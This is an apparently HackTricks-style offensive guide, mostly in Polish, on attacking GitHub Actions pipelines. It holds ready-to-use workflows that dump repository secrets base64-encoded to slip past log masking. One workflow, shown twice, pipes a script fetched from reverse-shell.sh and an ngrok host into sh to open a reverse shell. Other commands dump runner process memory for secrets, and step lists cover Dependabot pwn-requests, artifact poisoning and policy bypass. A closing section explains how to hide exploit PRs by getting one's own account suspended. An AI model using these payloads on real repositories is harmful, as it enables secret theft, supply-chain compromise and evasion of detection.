# Nadużywanie Github Actions

{{#include ../../../banners/hacktricks-training.md}}

## Narzędzia

The following tools are useful to find Github Action workflows and even find vulnerable ones:

- [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
- [https://github.com/praetorian-inc/gato](https://github.com/praetorian-inc/gato)
- [https://github.com/AdnaneKhan/Gato-X](https://github.com/AdnaneKhan/Gato-X)
- [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)
- [https://github.com/zizmorcore/zizmor](https://github.com/zizmorcore/zizmor) - Check also its checklist in [https://docs.zizmor.sh/audits](https://docs.zizmor.sh/audits)

## Podstawowe informacje

Na tej stronie znajdziesz:

- A **summary of all the impacts** of an attacker managing to access a Github Action
- Różne sposoby, aby **uzyskać dostęp do akcji**:
- Posiadanie **permissions** do utworzenia akcji
- Nadużywanie triggerów związanych z **pull request**
- Nadużywanie **other external access** techniques
- **Pivoting** z już skompromitowanego repo
- Na koniec sekcja o **post-exploitation techniques to abuse an action from inside** (wywołać wymienione skutki)

## Podsumowanie skutków

For an introduction about [**Github Actions check the basic information**](../basic-github-information.md#github-actions).

Jeśli możesz **execute arbitrary code in GitHub Actions** w ramach **repository**, możesz być w stanie:

- **Steal secrets** zamontowane w pipeline i **abuse the pipeline's privileges** aby uzyskać nieautoryzowany dostęp do zewnętrznych platform, takich jak AWS i GCP.
- **Compromise deployments** i inne **artifacts**.
- Jeśli pipeline wdraża lub przechowuje zasoby, możesz zmodyfikować finalny produkt, umożliwiając supply chain attack.
- **Execute code in custom workers** aby nadużyć mocy obliczeniowej i pivotować do innych systemów.
- **Overwrite repository code**, w zależności od uprawnień związanych z `GITHUB_TOKEN`.

## GITHUB_TOKEN

This "**secret**" (coming from `${{ secrets.GITHUB_TOKEN }}` and `${{ github.token }}`) is given when the admin enables this option:

<figure><img src="../../../images/image (86).png" alt=""><figcaption></figcaption></figure>

This token is the same one a **Github Application will use**, so it can access the same endpoints: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

> [!WARNING]
> Github should release a [**flow**](https://github.com/github/roadmap/issues/74) that **allows cross-repository** access within GitHub, so a repo can access other internal repos using the `GITHUB_TOKEN`.

Możesz zobaczyć możliwe **permissions** tego tokena pod adresem: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token)

Zauważ, że token **expires after the job has completed**.\
Takie tokeny wyglądają tak: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Kilka ciekawych rzeczy, które możesz zrobić z tym tokenem:

{{#tabs }}
{{#tab name="Merge PR" }}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header "content-type: application/json" \
-d "{\"commit_title\":\"commit_title\"}"
```
{{#endtab }}
{{#tab name="Approve PR" }}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{{#endtab }}
{{#tab name="Create PR" }}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{{#endtab }}
{{#endtabs }}

> [!CAUTION]
> Zwróć uwagę, że w niektórych przypadkach możesz znaleźć **github user tokens inside Github Actions envs or in the secrets**. Te tokeny mogą dać ci większe uprawnienia w repozytorium i organizacji.

<details>

<summary>Wyświetl sekrety w output Github Action</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Uzyskaj reverse shell przy użyciu secrets</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

Można sprawdzić uprawnienia przyznane Github Token w repozytoriach innych użytkowników, **sprawdzając logi** akcji:

<figure><img src="../../../images/image (286).png" alt="" width="269"><figcaption></figcaption></figure>

## Dozwolone wykonanie

> [!NOTE]
> Byłby to najprostszy sposób na przejęcie Github actions, ponieważ ten przypadek zakłada, że masz dostęp do **create a new repo in the organization**, albo masz **write privileges over a repository**.
>
> Jeśli znajdujesz się w takim scenariuszu, możesz po prostu sprawdzić [Post Exploitation techniques](#post-exploitation-techniques-from-inside-an-action).

### Wykonanie poprzez utworzenie repozytorium

Jeżeli członkowie organizacji mogą **create new repos** i możesz uruchamiać github actions, możesz **create a new repo and steal the secrets set at organization level**.

### Wykonanie z nowej gałęzi

Jeśli możesz **create a new branch in a repository that already contains a Github Action** skonfigurowaną, możesz ją **modify**, **upload** zawartość, a następnie **execute that action from the new branch**. W ten sposób możesz **exfiltrate repository and organization level secrets** (ale musisz wiedzieć, jak się one nazywają).

> [!WARNING]
> Jakiekolwiek ograniczenie zaimplementowane wyłącznie wewnątrz workflow YAML (na przykład, `on: push: branches: [main]`, job conditionals, lub manual gates) może być edytowane przez współpracowników. Bez zewnętrznego egzekwowania (branch protections, protected environments, and protected tags), współpracownik może przekierować workflow, aby uruchomić je na swojej gałęzi i nadużyć zamontowanych secrets/permissions.

Możesz sprawić, że zmodyfikowana akcja będzie wykonywalna **manually,** gdy **PR is created** lub gdy **some code is pushed** (w zależności od tego, jak głośno chcesz działać):
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name
# Use '**' instead of a branh name to trigger the action in all the cranches
```
---

## Wykonanie z forka

> [!NOTE]
> Istnieją różne wyzwalacze, które mogą pozwolić atakującemu na **execute a Github Action of another repository**. Jeśli te wyzwalacze są źle skonfigurowane, atakujący może je przejąć.

### `pull_request`

Wyzwalacz workflow **`pull_request`** uruchomi workflow za każdym razem, gdy zostanie otrzymane pull request, z pewnymi wyjątkami: domyślnie, jeśli to jest **pierwszy raz**, że współpracujesz, jakiś **maintainer** będzie musiał **zatwierdzić** **uruchomienie** workflow:

<figure><img src="../../../images/image (184).png" alt=""><figcaption></figcaption></figure>

> [!NOTE]
> Ponieważ **domyślne ograniczenie** dotyczy **pierwszych** contributorów, możesz przyczynić się, **poprawiając prawdziwy bug/typo**, a następnie wysyłać **inne PRy, aby nadużyć swoich nowych uprawnień `pull_request`**.
>
> **Przetestowałem to i to nie działa**: ~~Another option would be to create an account with the name of someone that contributed to the project and deleted his account.~~

Co więcej, domyślnie zabrania nadawania uprawnień zapisu i dostępu do sekretów w repozytorium docelowym, jak wspomniano w [**docs**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories):

> Z wyjątkiem `GITHUB_TOKEN`, **sekrety nie są przekazywane do runnera** gdy workflow jest wywoływany z **forked** repozytorium. **`GITHUB_TOKEN` ma uprawnienia tylko do odczytu** w pull requestach **z forked repositories**.

Atakujący mógłby zmodyfikować definicję Github Action, żeby wykonywać dowolne rzeczy i dołączać arbitralne akcje. Jednak nie będzie w stanie ukraść sekretów ani nadpisać repo z powodu wspomnianych ograniczeń.

> [!CAUTION]
> **Tak — jeśli atakujący zmieni w PR Github Action, która ma zostać uruchomiona, to jego Github Action będzie użyta, a nie ta z repo źródłowego!**

Ponieważ atakujący kontroluje także wykonywany kod, nawet jeśli nie ma sekretów ani uprawnień zapisu do `GITHUB_TOKEN`, atakujący może np. **upload malicious artifacts**.

### **`pull_request_target`**

Wyzwalacz workflow **`pull_request_target`** ma **write permission** do repozytorium docelowego oraz **access to secrets** (i nie wymaga zatwierdzenia).

Zauważ, że wyzwalacz workflow **`pull_request_target`** **uruchamia się w kontekście bazowym** a nie w tym dostarczonym przez PR (żeby **nie wykonywać niesprawdzonego kodu**). For more info about `pull_request_target` [**check the docs**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull_request_target).\
Moreover, for more info about this specific dangerous use check this [**github blog post**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/).

Może się wydawać, że ponieważ **uruchamiany workflow** jest tym zdefiniowanym w **base**, a **nie w PR**, użycie **`pull_request_target`** jest **bezpieczne**, ale istnieje **kilka przypadków, w których tak nie jest**.

A ten będzie miał **access to secrets**.

### `workflow_run`

The [**workflow_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow_run) trigger allows to run a workflow from a different one when it's `completed`, `requested` or `in_progress`.

W tym przykładzie workflow jest skonfigurowany tak, aby uruchamiać się po zakończeniu osobnego "Run Tests" workflow:
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
Co więcej, zgodnie z dokumentacją: workflow uruchomiony przez zdarzenie `workflow_run` może **uzyskać dostęp do sekretów i zapisywać tokeny, nawet jeśli poprzedni workflow tego nie mógł**.

Taki workflow może być zaatakowany, jeśli **zależy** od **workflow**, który może zostać **wyzwolony** przez zewnętrznego użytkownika za pomocą **`pull_request`** lub **`pull_request_target`**. Kilka podatnych przykładów można znaleźć w [**tym blogu**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**.** Pierwszy polega na tym, że workflow uruchamiany przez **`workflow_run`** pobiera kod atakującego: `${{ github.event.pull_request.head.sha }}`.  
Drugi polega na **przekazaniu** **artefaktu** z **niezaufanego** kodu do workflow **`workflow_run`** i użyciu zawartości tego artefaktu w sposób, który czyni go **podatnym na RCE**.

### `workflow_call`

TODO

TODO: Sprawdzić, czy gdy jest uruchamiany z pull_request używany/pobrany kod pochodzi z repozytorium źródłowego czy z forka PR

## Nadużywanie wykonania z forków

Wspomnieliśmy wszystkie sposoby, w jakie zewnętrzny atakujący może spowodować uruchomienie workflow GitHub; teraz przyjrzyjmy się, jak takie uruchomienia, jeśli są źle skonfigurowane, mogą być nadużyte:

### Wykonanie checkoutu z niezatwierdzonego źródła

W przypadku **`pull_request`** workflow zostanie wykonany w **kontekście PR** (czyli wykona **złośliwy kod PR**), ale ktoś musi go najpierw **autoryzować** i będzie działał z pewnymi [ograniczeniami](#pull_request).

W przypadku workflow używającego **`pull_request_target` or `workflow_run`**, który zależy od workflow, który może być wyzwolony przez **`pull_request_target` or `pull_request`**, zostanie wykonany kod z oryginalnego repozytorium, więc **atakujący nie może kontrolować wykonywanego kodu**.

> [!CAUTION]
> Jednak, jeśli **action** ma **jawny checkout PR**, który **pobrać kod z PR** (a nie z base), użyje kodu kontrolowanego przez atakującego. Na przykład (sprawdź linię 12 gdzie pobierany jest kod PR):

<pre class="language-yaml"><code class="lang-yaml"># INSECURE. Provided as an example only.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

Potencjalnie **niezaufany kod jest uruchamiany podczas `npm install` lub `npm build`**, ponieważ skrypty builda i odwoływane pakiety są kontrolowane przez autora PR.

> [!WARNING]
> GitHub dork do wyszukiwania podatnych actionów to: `event.pull_request pull_request_target extension:yml` jednak istnieją różne sposoby skonfigurowania jobów, tak aby były wykonywane bezpiecznie nawet jeśli action jest skonfigurowana niebezpiecznie (np. używając warunków dotyczących tego, kto jest aktorem generującym PR).

### Wstrzyknięcia skryptów kontekstowych <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

Zwróć uwagę, że istnieją pewne [**github contexts**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context), których wartości są **kontrolowane** przez **użytkownika** tworzącego PR. Jeśli github action używa tych **danych do wykonania czegokolwiek**, może to doprowadzić do **dowolnego wykonania kodu:**

{{#ref}}
gh-actions-context-script-injections.md
{{#endref}}

### **GITHUB_ENV Wstrzyknięcie skryptu** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

Zgodnie z dokumentacją: Możesz udostępnić **zmienną środowiskową dla dowolnych kolejnych kroków** w jobie workflow, definiując lub aktualizując zmienną środowiskową i zapisując to do pliku środowiskowego **`GITHUB_ENV`**.

Jeżeli atakujący będzie mógł **wstrzyknąć dowolną wartość** do tej zmiennej środowiskowej, mógłby wstrzyknąć zmienne środowiskowe, które umożliwią wykonanie kodu w kolejnych krokach, takie jak **LD_PRELOAD** lub **NODE_OPTIONS**.

Na przykład ([**this**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) i [**this**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), wyobraź sobie workflow, który ufa przesłanemu artefaktowi, aby zapisać jego zawartość w zmiennej środowiskowej **`GITHUB_ENV`**. Atakujący mógłby przesłać coś takiego, aby to skompromitować:

<figure><img src="../../../images/image (261).png" alt=""><figcaption></figcaption></figure>

### Dependabot i inne zaufane boty

Jak wskazano w [**tym wpisie na blogu**](https://boostsecurity.io/blog/weaponizing-dependabot-pwn-request-at-its-finest), kilka organizacji ma Github Action, która scala każdy PRR od `dependabot[bot]` jak w:
```yaml
on: pull_request_target
jobs:
auto-merge:
runs-on: ubuntu-latest
if: ${ { github.actor == 'dependabot[bot]' }}
steps:
- run: gh pr merge $ -d -m
```
To stanowi problem, ponieważ pole `github.actor` zawiera użytkownika, który spowodował ostatnie zdarzenie wywołujące workflow. Istnieje kilka sposobów, by spowodować, że użytkownik `dependabot[bot]` zmodyfikuje PR. Na przykład:

- Fork repozytorium ofiary
- Dodaj złośliwy payload do swojej kopii
- Włącz Dependabot w swoim forku, dodając przestarzałą zależność. Dependabot utworzy branch naprawiający zależność z złośliwym kodem.
- Otwórz Pull Request do repozytorium ofiary z tej gałęzi (PR zostanie utworzony przez użytkownika, więc na razie nic się nie stanie)
- Następnie atakujący wraca do początkowego PR, który Dependabot otworzył w jego forku i uruchamia `@dependabot recreate`
- Następnie Dependabot wykonuje pewne akcje na tej gałęzi, które modyfikują PR w repozytorium ofiary, co sprawia, że `dependabot[bot]` staje się aktorem ostatniego zdarzenia wywołującego workflow (i w związku z tym workflow zostaje uruchomiony).

Idąc dalej — co jeśli zamiast merge'owania, Github Action miałby command injection, jak w:
```yaml
on: pull_request_target
jobs:
just-printing-stuff:
runs-on: ubuntu-latest
if: ${ { github.actor == 'dependabot[bot]' }}
steps:
- run: echo ${ { github.event.pull_request.head.ref }}
```
Cóż, oryginalny wpis na blogu proponuje dwie opcje nadużycia tego zachowania, z których druga to:

- Fork the victim repository and enable Dependabot with some outdated dependency.
- Create a new branch with the malicious shell injeciton code.
- Change the default branch of the repo to that one
- Create a PR from this branch to the victim repository.
- Run `@dependabot merge` in the PR Dependabot opened in his fork.
- Dependabot will merge his changes in the default branch of your forked repository, updating the PR in the victim repository making now the `dependabot[bot]` the actor of the latest event that triggered the workflow and using a malicious branch name.

### Podatne Github Actions stron trzecich

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

Jak wspomniano w [**this blog post**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks), ta Github Action pozwala uzyskać dostęp do artifacts z różnych workflows, a nawet repositories.

Problem polega na tym, że jeśli parametr **`path`** nie jest ustawiony, artifact zostanie rozpakowany w bieżącym katalogu i może nadpisać pliki, które później mogą być użyte lub nawet wykonane w workflow. W związku z tym, jeśli Artifact jest podatny, atakujący może to wykorzystać do kompromitacji innych workflows, które ufają temu Artifact.

Example of vulnerable workflow:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
To można zaatakować przy użyciu tego workflow:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
---

## Inny dostęp zewnętrzny

### Usunięta przestrzeń nazw — Repo Hijacking

If an account changes it's name another user could register an account with that name after some time. If a repository had **less than 100 stars previously to the change of nam**e, Github will allow the new register user with the same name to create a **repository with the same name** as the one deleted.

> [!CAUTION]
> So if an action is using a repo from a non-existent account, it's still possible that an attacker could create that account and compromise the action.

If other repositories where using **dependencies from this user repos**, an attacker will be able to hijack them Here you have a more complete explanation: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

---

## Repo Pivoting

> [!NOTE]
> W tej sekcji omówimy techniki, które pozwolą **pivot z jednego repo do drugiego**, zakładając, że mamy jakiś rodzaj dostępu do pierwszego (sprawdź poprzednią sekcję).

### Cache Poisoning

Cache jest utrzymywany między uruchomieniami workflow w tej samej branch. To oznacza, że jeśli atakujący **skompromituje** **package**, który zostanie następnie zapisany w cache i pobrany oraz wykonany przez bardziej uprzywilejowany workflow, będzie mógł również skompromitować ten workflow.

{{#ref}}
gh-actions-cache-poisoning.md
{{#endref}}

### Artifact Poisoning

Workflows mogą używać **artifacts z innych workflows i nawet repos**, jeśli atakujący zdoła **skompromitować** Github Action, która **uploaduje artifact**, który jest później użyty przez inny workflow, to może **skompromitować te inne workflows**:

{{#ref}}
gh-actions-artifact-poisoning.md
{{#endref}}

---

## Post Exploitation from an Action

### Github Action Policies Bypass

As commented in [**this blog post**](https://blog.yossarian.net/2025/06/11/github-actions-policies-dumb-bypass), even if a repository or organization has a policy restricting the use of certain actions, an attacker could just download (`git clone`) and action inside the workflow and then reference it as a local action. As the policies doesn't affect local paths, **the action will be executed without any restriction.**

Przykład:
```yaml
on: [push, pull_request]

jobs:
test:
runs-on: ubuntu-latest
steps:
- run: |
mkdir -p ./tmp
git clone https://github.com/actions/checkout.git ./tmp/checkout

- uses: ./tmp/checkout
with:
repository: woodruffw/gha-hazmat
path: gha-hazmat

- run: ls && pwd

- run: ls tmp/checkout
```
### Dostęp do AWS i GCP przez OIDC

Sprawdź następujące strony:

{{#ref}}
../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md
{{#endref}}

{{#ref}}
../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md
{{#endref}}

### Dostęp do sekretów <a href="#accessing-secrets" id="accessing-secrets"></a>

Jeśli wstrzykujesz zawartość do skryptu, warto wiedzieć, jak możesz uzyskać dostęp do sekretów:

- Jeśli sekret lub token jest ustawiony jako **environment variable**, można go bezpośrednio odczytać z environment przy użyciu **`printenv`**.

<details>

<summary>Wyświetl sekrety w wyjściu Github Action</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Uzyskaj reverse shell z użyciem secrets</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

- Jeśli sekret jest użyty **bezpośrednio w wyrażeniu**, wygenerowany skrypt shell zostaje zapisany **na dysku** i jest dostępny.
- ```bash
cat /home/runner/work/_temp/*
```
- W przypadku JavaScript actions sekrety są przekazywane przez zmienne środowiskowe
- ```bash
ps axe | grep node
```
- W przypadku **custom action**, ryzyko może się różnić w zależności od tego, jak program używa sekretu, który otrzymał z **argumentu**:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

- Wylicz wszystkie sekrety za pomocą secrets context (poziom collaborator). Współpracownik z uprawnieniami write może zmodyfikować workflow na dowolnej gałęzi, aby zrzucić wszystkie sekrety repozytorium/org/środowiska. Użyj podwójnego base64, aby obejść maskowanie logów GitHub i dekoduj lokalnie:

```yaml
name: Steal secrets
on:
push:
branches: [ attacker-branch ]
jobs:
dump:
runs-on: ubuntu-latest
steps:
- name: Double-base64 the secrets context
run: |
echo '${{ toJson(secrets) }}' | base64 -w0 | base64 -w0
```

Dekoduj lokalnie:

```bash
echo "ZXdv...Zz09" | base64 -d | base64 -d
```

Wskazówka: dla ukrycia podczas testów, zaszyfruj przed wypisaniem (openssl jest preinstalowany na GitHub-hosted runners).

### Wykorzystywanie self-hosted runnerów

Sposób, by znaleźć, które **GitHub Actions są wykonywane poza infrastrukturą GitHub**, to wyszukanie **`runs-on: self-hosted`** w pliku konfiguracyjnym GitHub Action yaml.

**Self-hosted** runners mogą mieć dostęp do **dodatkowo wrażliwych informacji**, do innych **systemów sieciowych** (podatne endpoints w sieci? metadata service?) lub, nawet jeśli są izolowane i niszczone, **może być uruchomionych więcej niż jedna action jednocześnie** i złośliwa może **ukraść sekrety** innej.

W self-hosted runnerach możliwe jest również pozyskanie **sekretów z procesu _Runner.Listener_**, który będzie zawierał wszystkie sekrety workflowów na każdym etapie poprzez zrzut jego pamięci:
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
Zobacz [**ten wpis, aby uzyskać więcej informacji**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Rejestr obrazów Docker w Github

Możliwe jest stworzenie Github actions, które **zbudują i zapiszą obraz Dockera w Github**.\
Przykład można znaleźć w poniższym rozwijanym:

<details>

<summary>Github Action Build & Push Docker Image</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

Jak widać w poprzednim kodzie, rejestr Github jest hostowany w **`ghcr.io`**.

Użytkownik z uprawnieniami do odczytu repozytorium będzie mógł pobrać Docker Image, używając tokena dostępu osobistego:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
Następnie użytkownik mógłby przeszukać **leaked secrets in the Docker image layers:**

{{#ref}}
https://book.hacktricks.wiki/en/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics.html
{{#endref}}

### Wrażliwe informacje w logach Github Actions

Nawet jeśli **Github** próbuje **wykryć wartości sekretów** w logach akcji i **uniknąć ich wyświetlania**, inne wrażliwe dane, które mogły zostać wygenerowane podczas wykonania akcji, nie zostaną ukryte. Na przykład JWT podpisany wartością sekretu nie zostanie ukryty, chyba że jest [specifically configured](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret).

## Zacieranie śladów

(Technique from [**here**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) Po pierwsze, każdy utworzony PR jest wyraźnie widoczny publicznie na Github i dla docelowego konta GitHub. W GitHub domyślnie **nie możemy usunąć PR z internetu**, ale jest pewien haczyk. Dla kont Github, które zostały **zawieszone** przez Github, wszystkie ich **PR-y są automatycznie usuwane** i usuwane z internetu. Aby ukryć swoją aktywność, musisz albo doprowadzić do **zawieszenia konta GitHub lub oznaczenia konta**, albo sprawić, by konto zostało zgłoszone. To **ukryje wszystkie twoje działania** na GitHub przed internetem (w zasadzie usunie wszystkie twoje exploit PR).

Organizacja na GitHub jest bardzo proaktywna w zgłaszaniu kont do GitHub. Wystarczy, że udostępnisz „some stuff” w Issue i zadbają o to, żeby twoje konto zostało zawieszone w ciągu 12 godzin :p i oto masz — twój exploit niewidoczny na github.

> [!WARNING]
> Jedynym sposobem, by organizacja mogła stwierdzić, że była celem, jest sprawdzenie logów GitHub z SIEM, ponieważ z poziomu GitHub UI PR zostałby usunięty.

## Referencje

- [GitHub Actions: A Cloudy Day for Security - Part 1](https://binarysecurity.no/posts/2025/08/securing-gh-actions-part1)

{{#include ../../../banners/hacktricks-training.md}}
